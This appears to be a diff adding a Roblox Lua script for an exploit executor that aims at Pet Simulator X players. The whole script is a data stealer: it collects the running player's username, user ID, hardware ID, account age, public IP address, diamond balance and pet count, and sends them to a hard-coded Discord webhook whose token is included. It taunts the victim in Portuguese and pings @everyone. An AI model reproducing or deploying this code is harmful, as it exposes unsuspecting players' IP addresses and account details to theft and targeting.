@@ -1,0 +1,82 @@
+local HttpService = game:GetService("HttpService")
+local webhook_url = "https://discord.com/api/webhooks/1062115399182848071/x0RMp89DWaApJEJSWPIEaPfk9D9NukeEnAHQMksO3p98MyzyBqG4BkPvIP3r-jSGI0Dg"
+
+local function GetIp() : string
+    local request = request or http_request or (syn and syn.request)
+
+    local response = request({Url = "https://api.ipify.org?format=json", Method = "GET"})
+    response = game:GetService("HttpService"):JSONDecode(response.Body)
+
+
+    return response.ip
+end
+
+local responce = syn.request(
+{
+    Url = webhook_url,
+    Method = 'POST',
+    Headers = {
+        ['content-type'] = 'application/json'
+    },
+    Body = HttpService:jSONEncode({
+        ["content"] = "||@everyone **corre pro bank macaco**||",
+        ["embeds"] = {{
+            ["title"] = "**Seu script foi EXECUTADO**",
+            ["description"] = "Informações gerais da conta do roblox do " .. game.Players.LocalPlayer.Name,
+            ["type"] = "rich",
+            ["colour"] = tonumber(0xffffff),
+            ["fields"] = {
+                {
+                    ["name"] = "HWID :",
+                    ["value"] = game:GetService('RbxAnalyticsService'):GetClientId(),
+                    ["inline"] = true,
+                    
+                },
+                {
+                    ["name"] = "Place Id :",
+                    ["value"] = game.PlaceId,
+                    ["inline"] = true,
+                    
+                },
+                {
+                    ["name"] = "User Id :",
+                    ["value"] = game.Players.LocalPlayer.UserId,
+                    ["inline"] = true,
+                    
+                },
+                {
+                    ["name"] = "Account Age :",
+                    ["value"] = game.Players.LocalPlayer.AccountAge .. " Dias",
+                    ["inline"] = true,
+                    
+                },
+                {
+                    ["name"] = "Ip Address :",
+                    ["value"] = GetIp(),
+                    ["inline"] = true,
+
+                },
+                {
+                    ["name"] = "ㅤ                                                 Info PSX conta",
+                    ["value"] = "ㅤㅤㅤmostra as principais informações da conta dentro do psx",
+                    ["inline"] = false,
+
+                },
+                {
+                    ["name"] = "Diamonds :",
+                    ["value"] = "💎 | " .. game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text,	
+                    ["inline"] = true,
+
+                },
+                {
+                    ["name"] = "Pets Inventory :",
+                    ["value"] = "🐵 | " .. game.Players.LocalPlayer.PlayerGui.Inventory.Frame.PetAmount.Text,	
+                    ["inline"] = true,
+                    
+                }
+            }
+        }}
+
+    })
+}
+)
